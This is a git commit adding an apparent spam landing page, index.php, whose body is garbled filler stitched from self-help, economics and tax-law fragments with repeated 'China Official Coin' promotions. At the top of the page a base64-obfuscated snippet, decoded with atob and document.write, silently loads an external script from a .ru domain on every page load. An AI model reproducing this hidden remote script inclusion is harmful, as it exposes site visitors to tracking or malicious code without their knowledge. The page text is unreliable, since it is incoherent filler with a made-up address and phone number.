57a4734c0f386e0cc679194cd69c674e113fcc3b
zvafnoho <81926566+zvafnoho@users.noreply.github.com>
2021-04-04 21:29:32 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9lY2lmbmlyaGlpNnB2c2dmOTIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>First, you are not influenced by other people or circumstances.  But still</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="kz90apeggck3vg8mehpeha1">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="0osvq7ppfmwrql4qf5t1z">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>First, you are not influenced by other people or circumstances.  But still</h1>
+	</section>
+
+
+	<section class="our-work" class="xdyqwxtk0uzrzf9tqee3">
+		<h3 class="title">This is why it is so important when entering a new </h3>
+		<p>How their example inspires us! Nothing makes a stronger and more lasting impression on a person than the realization that the other has overcome his suffering, conquered circumstances and was the embodiment and expression of those values ​​that inspire, ennoble and elevate life. China Official Coin: Singapore, South Korea, Malaysia.  The habit of responding to the urgent but not important Quadrant III or the pleasure of escaping to Quadrant IV will try to outweigh the important affairs of Quadrant II planned by you.  Even when this does not last long, the presence of the P / PC balance is not in doubt.  Other caregivers feel the same way.  Expenses are considered reasonable and documented costs, losses,carried out (incurred) by the taxpayer: - justified expenses - economically justified costs, the assessment of which is expressed in monetary form; - documented expenses - expenses confirmed by documents drawn up in accordance with the legislation of the Russian Federation.  This principle is the key to effective interpersonal communication.  Anything you say will be wonderful and wonderful, but it may have little to do with me.  Are you satisfied with the house you live in? - Yes.  This is what our final mission statement sounds like: “Our mission is to help people and organizations dramatically increase their ability to achieve worthy goals through understanding and implementing principles of leadership.” Synergistic process,which led to the creation of our mission, has forever imprinted this text in the minds and hearts of each of us, and it has served us well as a guide for determining what we strive for, as well as what we do not strive for.  We don't need prejudice and prejudice.  This scenario ignored the danger of the emerging situation, which was characterized by extreme interdependence.  It is denoted by the letter D.  - Honey, Stephen just came in for a few minutes to help us.  THE LAW OF DEMAND Demand is a form of expression of need. </p>
+		<hr>
+
+		<ul class="grid" class="xj5i5tbt3tx2ygzw">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="xdyqwxtk0uzrzf9tqee3">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>I felt that participating in a synergistic process is much more important than talking about it, that creating something new is much mo</td>
+    <td>It is much more difficult to understand this principle in relation to the emotional sphere, to the sphere of human relations,</td>
+    <td>The main reason for the emergence of negative economies of scale is associated with the disruption of control over very large production.As pr</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>We are responsible for our effectiveness, for our own happiness and, ultimately, for most of the circumstances in our lives.  - What did you like the m</td>
+    <td>But often we don’t bother to take the time to make a diagnosis before that and truly, deeply understand the problem.  You are heavily dependent on o</td>
+    <td>It was a chicken and egg problem in finance.  Suddenly Stephen turned to the wall.  Likewise, habits have a tremendous force of attra</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Many people have dichotomous thinking in terms of either-or.  I heard about a divorce proceedings in which a judge ruled </td>
+    <td>Therefore, we decided to focus our efforts on ourselves - not on the ways of behavior,but on our deepest motives and on our percepti</td>
+    <td>And you can try to understand it.  He also has the right to vote at the meeting.  Thus, the legislation on means of individualization is an important part of the l</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="kz90apeggck3vg8mehpeha1">
+		<h3 class="title">I don’t want to talk, communicate with som</h3>
+		<p>Their total number has limits, and the application in any one area excludes the possibility of the same industrial use in another.  On the first day we discussed the question: "What is happening to us and why?" And then a lot was happening.  RENT The main feature of economic relations associated with the use of land as an irreplaceable, limited natural factor is the existence of land rent.  - Call him again! - I said.  One department store chain, thanks to this paradigm, has gained immense popularity among customers.  Inner orientation: The source of your correct behavior and your attitude towards life is the family scenario.  Allowing people to judge themselves for themselves has a much more ennobling effect on their spirits than when they are judged from the outside.  The concept of free, unrestricted competition characterized it as a process.  When the children were young, she herself chose the music, prepared the costumes, accompanied the piano and directed the performances herself. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="0osvq7ppfmwrql4qf5t1z" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="xdyqwxtk0uzrzf9tqee3">
+		<h3 class="title">The perfect competition market model is normative.  The nominal</h3>
+		<p>Consequently, the outdated production potential does not allow reducing costs. Chinese Coin: Sales Open In Today.  Some resources may already be owned by the enterprise.  We are unaware that this severe pain is the result of a deeper, chronic problem.  It stimulates an increase in production volumes, since with an increase in the volume of products sold, the mass of profits also increases.  Seek God's help and be worthy of it.  Do you have everything you need? - Yes.  “Do you think he understands that Jenny’s newborn?” I asked. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="xj5i5tbt3tx2ygzw" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="xj5i5tbt3tx2ygzw" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="kz90apeggck3vg8mehpeha1">
+		<h3 class="title">CHANGES IN SUPPLY Changes in supply are influenced </h3>
+		<p>This result turned out to be rallying and very enjoyable.  Enterprises received the right to independently manage the depreciation fund.  The capital market is sometimes subdivided into a securities market and a capital market.  I will show strength of character and personal interest.  Most of them have never been trained in management.  These people are responsible for effectively using their influence and directing it to those things from the Circle of Concern that are of priority to them.  This designation has certain advantages in the sense thatwhich reminds us that the wage rate is the price paid for the use of a unit of labor.  For relationships with wife, husband, children, friends, or colleagues to be effective, we must learn to listen.  He desperately needed help.  This is especially useful when creating Personal Mission statements, since the two unique human gifts that enable us to use Habit 2 — imagination and conscience — are primarily functions of the right brain hemisphere.  I believe that this vital unity is the most important source of self-esteem.  A trademark is an active link between the manufacturer and the consumer, acting as a silent seller. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="0osvq7ppfmwrql4qf5t1z" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="xdyqwxtk0uzrzf9tqee3">
+		<h3 class="title">This pattern is a strong emotional depende</h3>
+		<p>Strength comes from muscle resistance exercises - simple gymnastic exercises, push-ups, pull-ups, squats, and weight-bearing exercises.  Once, sitting naked in a solitary confinement cell, he discovered what he later called "the last human freedom", that freedom that none of his Nazi torturers could take away from him.  I suspect that many of the problems they shared with me are familiar to you.  The choice of an alternative is often associated with the answer to the question of what to prefer: quick profit at the cost of future losses or current losses for the sake of profit in the future? On the one hand, this complicates the estimation of costs. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="xj5i5tbt3tx2ygzw" class="title">By the third method I have chosenwas bribery.  And these shifts</h3>	
+		<p>The man works with full dedication - no downtime, no breaks for machine maintenance. China Official Coin: Singapore, South Korea, Malaysia.  “Lose / Win” Some are programmed differently - “Lose / Win”.  It may turn out thatI don’t know how to listen carefully to another person.  Otherwise, while working on the second - physical - creation, you will have to make costly changes that can double the cost of building your home.  Sure,over a certain period of time, consumer expenses may differ from his income, since there is a loan and personal savings.  In a market economy, this is done by the entrepreneur himself as the organizer of production.  I must remember everything. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="kz90apeggck3vg8mehpeha1">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="0osvq7ppfmwrql4qf5t1z"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="xdyqwxtk0uzrzf9tqee3"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="xj5i5tbt3tx2ygzw"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>999 Nasir Stream, Suite 468, 69296, Haleychester, Ohio, United States</p>
+		<p>Phone number: +36(11)895-48042</p>
+	</footer>
+
+</body>
+
+</html>
